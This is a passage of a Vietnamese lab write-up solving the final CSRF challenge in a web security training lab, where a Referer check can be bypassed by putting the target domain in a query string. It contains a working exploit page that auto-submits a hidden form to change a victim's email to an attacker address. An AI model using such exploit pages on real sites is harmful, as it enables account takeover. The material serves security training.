Hmm khi ta sửa vớ vẩn thì cũng bị dính lỗi, ở đây ta để ý rằng request hợp lệ khi nó là một domain vậy câu hỏi ở đây là nếu ta thử vứt vào một đường dẫn là domain fake thì sao ta?

![image](https://hackmd.io/_uploads/H1Yrvu4l-e.png)

Ồ vậy là tuy đã fix được lỗi trước nhưng ở đây có vẻ anh dev đã không validate lại đoạn domain nên nếu ta bỏ vào domain nào thì nó cũng cho là hợp lệ và cho phép thực thi được update email, ở đây tôi sửa nó thành `Referer: https://testdomain.net?0a5400f903eb547480aa17e7006900ad.web-security-academy.net/my-account?id=wiener` và bypass được filter.

Bây giờ dựa vào tình huống trên ta sẽ tạo exploit code.

```html 
<html>
<head>
  <meta name="referrer" content="unsafe-url">
</head>
<body>
<script>
    history.pushState("", "", "/?0a5400f903eb547480aa17e7006900ad.web-security-academy.net")
</script>
<form action="https://0a5400f903eb547480aa17e7006900ad.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="phathacker@evil.com" />
</form>
<script>
    document.forms[0].submit();
</script>
</body>
</html>
```

![image](https://hackmd.io/_uploads/rkThddEgWg.png)

Thành công solve lab này là cũng là lab cuối cùng kết thúc chuỗi challenge CSRF.